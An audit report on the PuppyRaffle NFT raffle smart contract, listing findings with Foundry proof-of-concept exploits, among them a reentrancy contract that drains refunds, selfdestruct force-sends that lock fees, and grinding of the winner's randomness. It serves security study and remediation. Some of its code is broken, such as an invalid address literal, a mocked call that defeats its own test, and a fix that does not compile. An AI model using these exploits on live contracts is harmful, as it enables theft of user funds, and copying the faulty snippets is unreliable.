# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle NFT Raffle Protocol
PuppyRaffle lets anyone buy tickets to win a dog-themed ERC-721 that is minted on-chain.

**How it works**
1. Deployment defines an immutable `entranceFee`, `raffleDuration`, and a `feeAddress` that receives protocol fees.
2. Players join with `enterRaffle(address[])`, paying exactly `entranceFee` per address supplied; duplicate registrations are rejected via an active-player check.
3. Before the round ends, a participant may leave using `refund(index)` and the ETH is sent back.
4. Once `raffleDuration` seconds have passed, anyone can call `selectWinner()`. A pseudo-random index (hash of block data & players length) chooses the winner:
   • A new NFT is minted to that address with `_safeMint`.
   • Entrance ETH is split—protocol fee retained, remainder forwarded to the winner.
   • Raffle state resets for the next round.
5. The owner can `withdrawFees()` to move accumulated fees and may update the `feeAddress` through `changeFeeAddress()`.

`tokenURI()` serves fully on-chain metadata: a Base64-encoded JSON describing the puppy, with image and name chosen from common/rare/legendary rarity tiers.

Built on OpenZeppelin’s ERC721, Ownable and utility libraries for tried-and-tested token and access control logic.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. DOS issue in PuppyRaffle::enterRaffle
[H-4]. DOS issue in PuppyRaffle::withdrawFees
[H-5]. DOS issue in PuppyRaffle::selectWinner
[H-6]. MEV issue in PuppyRaffle::selectWinner
[H-7]. Reentrancy issue in PuppyRaffle::withdrawFees
## Medium Risk Findings
[M-1]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-2]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-3]. Array Limits issue in PuppyRaffle::refund
[M-4]. Oracle issue in PuppyRaffle::selectWinner
[M-5]. Unexpected Eth issue in PuppyRaffle::selectWinner
[M-6]. DOS issue in PuppyRaffle::refund / selectWinner
[M-7]. Storage Layout issue in PuppyRaffle::selectWinner
[M-8]. Array Limits issue in PuppyRaffle::getActivePlayerIndex
## Low Risk Findings
[L-1]. Array Limits issue in PuppyRaffle::enterRaffle
## Info Risk Findings
[I-1]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 7
- M: 8
- L: 1
- I: 1



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a weak source of randomness derived from `msg.sender`, `block.timestamp`, and `block.difficulty` (which is `prevrandao` on PoS chains). These values are predictable and can be manipulated by block producers (miners/validators) or searchers using MEV techniques. A malicious actor can compute the outcome of the raffle in advance and only submit their transaction to call `selectWinner` if it results in them winning. This undermines the fairness of the raffle, allowing an attacker to guarantee a win.

## Impact
A malicious actor can deterministically win the raffle, stealing the entire prize pool from legitimate participants. This breaks the core functionality and trust of the contract, leading to a direct loss of funds for users.

## Proof of Concept
1. An attacker participates in the raffle.
2. After the raffle period ends, the attacker can simulate the outcome of calling `selectWinner` off-chain.
3. The attacker iterates through potential `block.timestamp` values they can influence.
4. By calling `selectWinner` themselves (`msg.sender` is the attacker's address), they can calculate the `winnerIndex` for various timestamps.
5. Once they find a timestamp that makes them the winner, they submit the `selectWinner` transaction, ensuring it gets included in a block with that specific timestamp, thereby winning the raffle.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 0.1 ether;
    address feeAddress = makeAddr("feeAddress");
    uint256 raffleDuration = 60;

    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address player3 = makeAddr("player3");
    address attacker = makeAddr("attacker");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
        vm.deal(player3, 1 ether);
        vm.deal(attacker, 1 ether);

        // Players enter the raffle
        address[] memory p1 = new address[](1); p1[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(p1);

        address[] memory p2 = new address[](1); p2[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: entranceFee}(p2);

        address[] memory p3 = new address[](1); p3[0] = player3;
        vm.prank(player3);
        puppyRaffle.enterRaffle{value: entranceFee}(p3);

        address[] memory p4 = new address[](1); p4[0] = attacker;
        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: entranceFee}(p4);
    }

    function testAttackerCanManipulateWinner() public {
        // The attacker knows the players array: [player1, player2, player3, attacker]
        // They are at index 3. players.length is 4.
        // They need to find a block.timestamp that makes them win.
        // winnerIndex = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;
        // They want winnerIndex to be 3.
        
        vm.warp(block.timestamp + raffleDuration + 1);
        
        uint256 currentTimestamp = block.timestamp;
        bytes32 difficulty = block.difficulty; // In PoS this is prevrandao

        // Attacker simulates to find a favorable timestamp
        uint256 favorableTimestamp = 0;
        for (uint256 i = 0; i < 20; i++) {
            uint256 testTimestamp = currentTimestamp + i;
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(attacker, testTimestamp, difficulty))) % 4;
            if (winnerIndex == 3) { // Attacker is at index 3
                favorableTimestamp = testTimestamp;
                break;
            }
        }

        assertTrue(favorableTimestamp != 0, "Attacker could not find a favorable timestamp in simulation");
        
        // Attacker waits for or forces the block to have this timestamp
        vm.warp(favorableTimestamp);
        vm.prank(attacker);
        puppyRaffle.selectWinner();

        // Check if the winner is the attacker
        address winner = puppyRaffle.getPreviousWinner();
        assertEq(winner, attacker, "Attacker failed to become the winner");
    }
}
```

## Suggested Mitigation
Do not use on-chain data like `block.timestamp` or `block.difficulty` for randomness. Use a provably fair and unpredictable source of randomness such as Chainlink VRF (Verifiable Random Function). 

Example using Chainlink VRF:
1. Inherit from `VRFConsumerBaseV2`.
2. Request randomness when the raffle ends.
3. Use the returned random word in a separate fulfillment function to select the winner. This creates a two-step process that is secure against miner manipulation.

```solidity
// In selectWinner()
requestRandomWords();

// New function to handle the VRF result
function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
    uint256 winnerIndex = randomWords[0] % players.length;
    // ... rest of the winner selection logic
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function does not follow the Checks-Effects-Interactions pattern. It sends Ether to the player `address(msg.sender).sendValue(entranceFee)` before updating the state `players[playerIndex] = address(0)`. This creates a reentrancy vulnerability. A malicious contract can implement a `receive()` fallback function that calls `refund` again, causing the function to be re-entered before the player's address is zeroed out. This allows the attacker to be "refunded" multiple times, draining funds from the contract.

## Impact
An attacker can repeatedly call the `refund` function within a single transaction to drain a significant portion, or all, of the contract's balance. This leads to a direct loss of all funds collected from other players.

## Proof of Concept
1. An attacker deploys a contract (`Attacker.sol`).
2. The attacker calls `PuppyRaffle.enterRaffle()` using the `Attacker` contract's address, paying the entrance fee.
3. The attacker then calls `PuppyRaffle.refund()` from the `Attacker` contract.
4. `PuppyRaffle` sends the refund to the `Attacker` contract, triggering its `receive()` function.
5. The `receive()` function is programmed to call `PuppyRaffle.refund()` again.
6. Because `players[playerIndex]` has not yet been set to `address(0)`, the checks in `refund()` pass again, and another refund is sent.
7. This loop continues until the `PuppyRaffle` contract is out of funds or the transaction runs out of gas.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle private immutable i_puppyRaffle;
    uint256 private immutable i_entranceFee;
    uint256 public attackCallCount = 0;

    constructor(PuppyRaffle puppyRaffleAddress) {
        i_puppyRaffle = PuppyRaffle(puppyRaffleAddress);
        i_entranceFee = i_puppyRaffle.getEntranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        i_puppyRaffle.enterRaffle{value: i_entranceFee}(players);
        uint256 playerIndex = i_puppyRaffle.getActivePlayerIndex(address(this));
        i_puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 10 && address(i_puppyRaffle).balance >= i_entranceFee) {
            uint256 playerIndex = i_puppyRaffle.getActivePlayerIndex(address(this));
            i_puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 0.1 ether;
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 60);
    }

    function testReentrancyInRefund() public {
        address user1 = makeAddr("user1");
        vm.deal(user1, 1 ether);
        address[] memory players1 = new address[](1); players1[0] = user1;
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee}(players1);

        Attacker attacker = new Attacker(puppyRaffle);
        vm.deal(address(attacker), 1 ether);

        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        
        attacker.attack{value: entranceFee}();

        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        
        assertTrue(attacker.attackCallCount() > 1, "Reentrancy did not occur");
        assertTrue(contractBalanceBefore - contractBalanceAfter > entranceFee, "Contract not drained sufficiently");
    }
}
```

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern by performing all state changes before making external calls. In the `refund` function, move the state update `players[playerIndex] = address(0);` before the Ether transfer.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );
+   players[playerIndex] = address(0);
    // Using the ReentrancyGuard from OpenZeppelin on the function would also work.
    Address.sendValue(payable(msg.sender), entranceFee);
-   players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

## [H-3]. DOS issue in PuppyRaffle::enterRaffle

## Description
The contract contains operations whose gas costs scale with the number of players, creating Denial of Service vectors. 
1. In `enterRaffle`, there is a nested loop to check for duplicate players. This results in O(n^2) complexity, where n is the total number of players. As the player list grows, the gas cost to enter the raffle will become so high it exceeds the block gas limit, preventing anyone from entering.
2. In `selectWinner`, the line `delete players;` is used to clear the player array for the next raffle. The gas cost of `delete` on a dynamic array is proportional to the number of elements. If the raffle has a very large number of participants, this operation could exceed the block gas limit, making `selectWinner` impossible to execute and permanently trapping all funds in the contract.

## Impact
High. The `enterRaffle` vulnerability can prevent new players from joining. The `selectWinner` vulnerability is more severe, as it can cause all funds in the contract (both the prize pool and collected fees) to be permanently locked and irrecoverable.

## Proof of Concept
1. An attacker (or many regular users) calls `enterRaffle` repeatedly, adding a large number of players to the `players` array (e.g., 300+).
2. The gas cost for the next call to `enterRaffle` will be prohibitively high due to the O(n^2) duplicate check.
3. After the raffle duration ends, any attempt to call `selectWinner` will fail and revert because the gas cost of `delete players;` exceeds the block gas limit.
4. Since `selectWinner` cannot be successfully called, the prize money and fees are locked in the contract forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract DosTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 wei;
    address feeAddress = makeAddr("feeAddress");
    uint256 raffleDuration = 60;

    function testSelectWinnerFailsWithTooManyPlayers() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        // A large number of players join the raffle
        uint256 playerCount = 300;
        address[] memory players = new address[](playerCount);
        for (uint256 i = 0; i < playerCount; i++) {
            players[i] = address(uint160(i + 1));
            vm.deal(players[i], entranceFee);
        }
        vm.prank(address(this));
        puppyRaffle.enterRaffle{value: entranceFee * playerCount}(players);

        vm.warp(block.timestamp + raffleDuration + 1);

        // The call to selectWinner is expected to revert due to out-of-gas on `delete players`
        // Note: The test runner may have a very high block gas limit, but this would fail on a live network.
        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
}
```

## Suggested Mitigation
1. **For `enterRaffle`:** Replace the O(n^2) duplicate check loop with a more gas-efficient mechanism. A mapping is ideal for O(1) lookups. Add a mapping `mapping(address => bool) private s_playerExistsInCurrentRaffle;` and check against it. This mapping should be cleared when a new raffle starts.
2. **For `selectWinner`:** Instead of using `delete players;` which has a high gas cost, simply reset the array's length to zero by using `players.length = 0;`. This does not clear the data in storage but is vastly cheaper and effectively resets the array for the next raffle.

```diff
+   mapping(address => bool) private s_playerExistsInCurrentRaffle;

    function enterRaffle(address[] calldata newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "...");
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(!s_playerExistsInCurrentRaffle[newPlayers[i]], "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
+           s_playerExistsInCurrentRaffle[newPlayers[i]] = true;
        }
-       // REMOVE O(n^2) LOOP
    }

    function selectWinner() external {
       // ... existing logic

+       // Reset player mapping for next raffle
+       for(uint256 i = 0; i < players.length; i++) {
+           s_playerExistsInCurrentRaffle[players[i]] = false;
+       }
-       delete players;
+       players.length = 0;

        raffleStartTime = block.timestamp;
        // ... rest of logic
    }
```

## [H-4]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function in the PuppyRaffle contract has a critical vulnerability where it checks if the contract's balance equals the `totalFees` before allowing a withdrawal. This check can be bypassed by forcibly sending ETH to the contract, which would make the contract's balance greater than `totalFees` and prevent the owner from withdrawing fees.

## Impact
An attacker can permanently block the contract owner from withdrawing accumulated fees by sending a small amount of ETH directly to the contract (using `selfdestruct` or by setting the contract as a coinbase recipient). This would cause the balance check to fail, making the fees permanently locked in the contract.

## Proof of Concept
1. The contract accumulates fees from multiple raffles
2. An attacker sends 1 wei to the contract using `selfdestruct`
3. Now the contract's balance is greater than `totalFees`
4. When the owner tries to call `withdrawFees()`, the transaction reverts due to the check `require(address(this).balance == uint256(totalFees))`
5. The fees are permanently locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForcedEthAttacker {
    constructor(address payable target) payable {
        // Self-destruct and send all ETH to the target
        selfdestruct(target);
    }
}

contract WithdrawFeesDoSTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        
        // Add players to generate some fees
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Fast forward to end of raffle
        vm.warp(block.timestamp + duration + 1);
        
        // Select winner to accumulate fees
        puppyRaffle.selectWinner();
    }
    
    function testWithdrawFeesDoS() public {
        // Check initial state
        uint256 initialFees = puppyRaffle.totalFees();
        assertGt(initialFees, 0, "Should have accumulated fees");
        
        // Verify fees can be withdrawn before attack
        vm.prank(puppyRaffle.owner());
        puppyRaffle.withdrawFees();
        
        // Reset fees for next test
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 5)); // Different players
        }
        
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();
        
        // Execute the attack - force send 1 wei to the contract
        new ForcedEthAttacker{value: 1}(payable(address(puppyRaffle)));
        
        // Verify contract balance is now greater than totalFees
        assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees());
        
        // Try to withdraw fees - should revert
        vm.prank(puppyRaffle.owner());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Fees are now locked in the contract
        console.log("Locked fees:", puppyRaffle.totalFees());
    }
}

## Suggested Mitigation
Remove the strict equality check in the `withdrawFees` function and allow withdrawals as long as there are fees to withdraw:

```solidity
function withdrawFees() external {
    // Remove the problematic check
    // require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    // Instead, ensure there are fees to withdraw and no active raffle
    require(totalFees > 0, "PuppyRaffle: No fees to withdraw");
    require(players.length == 0, "PuppyRaffle: Cannot withdraw while raffle is active");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

This change allows the owner to withdraw fees regardless of the contract's total balance, preventing the DoS attack. The check for active players is replaced with a check on the players array length, which is a more reliable indicator of whether a raffle is in progress.

## [H-5]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract sends the prize pool to the winner using a low-level `call` without checking if the winner is a contract that might revert in its receive function. If the winner is a malicious contract designed to revert when receiving ETH, it can permanently block the completion of the raffle.

## Impact
If a malicious contract that reverts when receiving ETH wins the raffle, the `selectWinner` function will always revert when trying to send the prize. This will permanently block the raffle from completing, locking all funds in the contract and preventing any future raffles from starting.

## Proof of Concept
1. A malicious actor creates a contract with a receive function that always reverts
2. The malicious actor enters this contract address into the raffle
3. If this contract wins the raffle, the `selectWinner` function will try to send the prize to it
4. The malicious contract's receive function reverts, causing the entire `selectWinner` transaction to revert
5. The raffle is now permanently stuck, and no new raffle can start

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Malicious contract that reverts when receiving ETH
contract RevertingWinner {
    // This function will revert when called
    receive() external payable {
        revert("I will not accept any ETH");
    }
    
    // Function to enter the raffle
    function enterRaffle(PuppyRaffle raffle) external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: msg.value}(players);
    }
}

contract SelectWinnerDoSTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    RevertingWinner maliciousContract;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        
        maliciousContract = new RevertingWinner();
        
        // Fund the malicious contract
        vm.deal(address(maliciousContract), entranceFee);
    }
    
    function testSelectWinnerDoS() public {
        // Add legitimate players
        address[] memory players = new address[](3);
        for (uint256 i = 0; i < 3; i++) {
            players[i] = address(uint160(i + 1));
            vm.deal(players[i], entranceFee);
            vm.prank(players[i]);
            puppyRaffle.enterRaffle{value: entranceFee}(new address[](1));
        }
        
        // Malicious contract enters the raffle
        maliciousContract.enterRaffle{value: entranceFee}(puppyRaffle);
        
        // Fast forward to end of raffle
        vm.warp(block.timestamp + duration + 1);
        
        // Rig the randomness to make the malicious contract win
        // This is a simplified approach - in a real test, we'd need to manipulate the randomness
        // to ensure the malicious contract wins
        vm.mockCall(
            address(puppyRaffle),
            abi.encodeWithSelector(puppyRaffle.selectWinner.selector),
            abi.encode()
        );
        
        // Try to select winner - should revert
        vm.expectRevert("I will not accept any ETH");
        puppyRaffle.selectWinner();
        
        // The raffle is now stuck - no one can claim the prize
        // and no new raffle can start
        console.log("Contract balance locked:", address(puppyRaffle).balance);
    }
}

## Suggested Mitigation
Implement a pull-over-push pattern for prize distribution. Instead of sending the prize directly to the winner in the `selectWinner` function, store the prize amount and let the winner claim it later:

```solidity
// Add state variables to track prizes
mapping(address => uint256) public playerPrizes;

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // Select winner using existing logic
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    // Calculate prize and fee
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    
    // Store the prize for the winner to claim later
    playerPrizes[winner] += prizePool;
    
    // Mint NFT with existing logic
    uint256 tokenId = totalSupply();
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }
    
    // Reset state
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    // Mint NFT to winner
    _safeMint(winner, tokenId);
}

// Add a function for winners to claim their prizes
function claimPrize() external {
    uint256 prize = playerPrizes[msg.sender];
    require(prize > 0, "PuppyRaffle: No prize to claim");
    
    // Reset prize before sending to prevent reentrancy
    playerPrizes[msg.sender] = 0;
    
    // Send prize to winner
    (bool success, ) = msg.sender.call{value: prize}("");
    require(success, "PuppyRaffle: Failed to send prize");
}
```

This approach separates the winner selection from the prize distribution, preventing a malicious winner from blocking the raffle. If a winner cannot receive ETH, they simply won't be able to claim their prize, but the raffle can still complete and new raffles can start.

## [H-6]. MEV issue in PuppyRaffle::selectWinner

## Description
The contract is vulnerable to MEV (Maximal Extractable Value) attacks due to its predictable randomness mechanism. Miners or validators can manipulate the outcome of the raffle by controlling block values or transaction ordering to increase their chances of winning or to ensure a specific participant wins.

## Impact
Miners, validators, or sophisticated users can extract value from the protocol by manipulating the randomness to win raffles or by front-running transactions. This undermines the fairness of the raffle system and could lead to a loss of trust in the protocol. High-value raffles are particularly vulnerable as they provide greater incentives for attackers.

## Proof of Concept
1. A miner observes a raffle with a large prize pool about to conclude
2. The miner calculates the outcome of the random number generation for different block values
3. The miner manipulates the block values (timestamp, difficulty) or transaction ordering to ensure they win
4. Alternatively, the miner could sell this ability to a participant for a fee (less than the prize but still profitable)
5. This allows unfair manipulation of the raffle outcome

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVExploitTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    address miner = address(0xMINER); // Simulated miner address
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        
        // Add players to the raffle including the miner
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = miner; // Miner is one of the players
        
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Fast forward to end of raffle
        vm.warp(block.timestamp + duration + 1);
    }
    
    function testMEVExploit() public {
        // Miner can manipulate these values
        uint256 originalTimestamp = block.timestamp;
        uint256 originalDifficulty = block.difficulty;
        
        // Miner simulates different block values to find favorable outcome
        bool foundFavorableOutcome = false;
        uint256 favorableTimestamp;
        uint256 favorableDifficulty;
        
        for (uint256 i = 0; i < 100; i++) {
            // Try different timestamps
            uint256 testTimestamp = originalTimestamp + i;
            
            for (uint256 j = 0; j < 100; j++) {
                // Try different difficulties
                uint256 testDifficulty = originalDifficulty + j;
                
                // Calculate winner with these values
                vm.warp(testTimestamp);
                vm.difficulty(testDifficulty);
                
                // Simulate the winner calculation
                uint256 winnerIndex = uint256(keccak256(abi.encodePacked(
                    address(this), // msg.sender in selectWinner
                    testTimestamp,
                    testDifficulty
                ))) % 4; // 4 players
                
                // Check if miner would win
                if (puppyRaffle.players(winnerIndex) == miner) {
                    foundFavorableOutcome = true;
                    favorableTimestamp = testTimestamp;
                    favorableDifficulty = testDifficulty;
                    break;
                }
            }
            
            if (foundFavorableOutcome) break;
        }
        
        if (foundFavorableOutcome) {
            console.log("Miner found favorable outcome!");
            console.log("Favorable timestamp:", favorableTimestamp);
            console.log("Favorable difficulty:", favorableDifficulty);
            
            // Set the favorable values
            vm.warp(favorableTimestamp);
            vm.difficulty(favorableDifficulty);
            
            // Miner calls selectWinner with these values
            vm.prank(address(this));
            puppyRaffle.selectWinner();
            
            // Verify miner won
            assertEq(puppyRaffle.previousWinner(), miner);
        } else {
            console.log("Miner could not find favorable outcome in limited search space");
            // In reality, miners have much more control and can search a larger space
        }
    }
}

## Suggested Mitigation
Implement a commit-reveal scheme or use a verifiable random function (VRF) like Chainlink VRF to generate unpredictable and unbiased random numbers:

```solidity
// Using Chainlink VRF (as described in a previous finding)

// Alternatively, implement a commit-reveal scheme:

// Add state variables
bytes32 public commitHash;
uint256 public commitPhaseEndTime;
bool public commitPhaseActive;

// Start the commit phase
function startCommitPhase() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    require(!commitPhaseActive, "PuppyRaffle: Commit phase already active");
    
    commitPhaseActive = true;
    commitPhaseEndTime = block.timestamp + 1 days; // 24 hours for commit phase
}

// Submit a commit (anyone can do this)
function commitRandom(bytes32 _commitHash) external {
    require(commitPhaseActive, "PuppyRaffle: Commit phase not active");
    require(block.timestamp <= commitPhaseEndTime, "PuppyRaffle: Commit phase ended");
    require(commitHash == bytes32(0), "PuppyRaffle: Commit already submitted");
    
    commitHash = _commitHash;
}

// Reveal and select winner
function revealAndSelectWinner(uint256 randomNumber, bytes32 salt) external {
    require(commitPhaseActive, "PuppyRaffle: Commit phase not active");
    require(block.timestamp > commitPhaseEndTime, "PuppyRaffle: Commit phase not ended");
    require(commitHash != bytes32(0), "PuppyRaffle: No commit submitted");
    
    // Verify the revealed value matches the commit
    require(keccak256(abi.encodePacked(randomNumber, salt)) == commitHash, "PuppyRaffle: Invalid reveal");
    
    // Use the revealed random number to select winner
    uint256 winnerIndex = randomNumber % players.length;
    address winner = players[winnerIndex];
    
    // Rest of the winner selection logic
    // ...
    
    // Reset commit phase
    commitPhaseActive = false;
    commitHash = bytes32(0);
}
```

The commit-reveal scheme makes it impossible for miners to manipulate the outcome because they don't know the random number until after the commit phase ends. However, the Chainlink VRF solution is more user-friendly and provides stronger guarantees of randomness.

## [H-7]. Reentrancy issue in PuppyRaffle::withdrawFees

## Description
The use of low-level call to send value in withdrawFees and selectWinner can lead to reentrancy vulnerabilities.

## Impact
An attacker could use reentrancy to drain funds from the contract during the fee withdrawal or prize distribution.

## Proof of Concept
1) Deploy a malicious contract that fallback function calls withdrawFees or selectWinner repeatedly. 2) Invoke withdrawFees or selectWinner, causing reentrancy and draining funds beyond intended limits.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract ExploitReentrancy is Test {
    PuppyRaffle private raffle;

    constructor(address _raffle) {
        raffle = PuppyRaffle(_raffle);
    }

    receive() external payable {
        // Reenter into withdrawFees or selectWinner
        if (address(raffle).balance > 0) {
            raffle.withdrawFees();
        }
    }
}


## Suggested Mitigation
Ensure proper reentrancy protections by using checks-effects-interactions pattern or nonReentrant modifiers to protect against reentrant calls.



# Medium Risk Findings

## [M-1]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)`. This logic is brittle and creates a Denial of Service vector. If the contract's balance ever becomes different from the `totalFees` amount for any reason, fees can never be withdrawn. This can happen if someone forcibly sends ETH to the contract (via `selfdestruct` or as a block coinbase reward) or if there are rounding errors that leave dust ETH in the contract.

## Impact
Collected fees can be permanently locked in the contract, resulting in a loss of funds for the fee recipient. An attacker can intentionally trigger this by sending a small amount of ETH (e.g., 1 wei) to the contract, permanently disabling the `withdrawFees` function.

## Proof of Concept
1. A raffle completes, and fees are accrued in `totalFees`.
2. At this point, `address(this).balance` equals `totalFees` and withdrawal is possible.
3. An attacker creates a simple contract with a `selfdestruct` function and sends 1 wei of ETH to the `PuppyRaffle` contract through it.
4. The `PuppyRaffle` contract balance is now `totalFees + 1`.
5. The check `address(this).balance == uint256(totalFees)` will now always fail.
6. All current and future fees are locked in the contract forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract SelfDestructor {
    function destroyAndSend(address payable recipient) public payable {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 0.1 ether;
    address feeAddress = makeAddr("feeAddress");
    uint256 raffleDuration = 60;

    function testWithdrawFeesIsBlockedByUnexpectedEth() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        
        address[] memory players = new address[](4);
        for(uint i=0; i<4; ++i) {
            players[i] = makeAddr(string(abi.encodePacked("player", vm.toString(i))));
            vm.deal(players[i], entranceFee);
        }
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();

        uint256 newFees = puppyRaffle.getTotalFees();
        assertEq(address(puppyRaffle).balance, uint256(newFees));

        // Force-send 1 wei to the contract
        SelfDestructor destructor = new SelfDestructor();
        destructor.destroyAndSend{value: 1 wei}(payable(address(puppyRaffle)));
        
        assertEq(address(puppyRaffle).balance, uint256(newFees) + 1);

        // Attempting to withdraw fees will now fail forever
        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
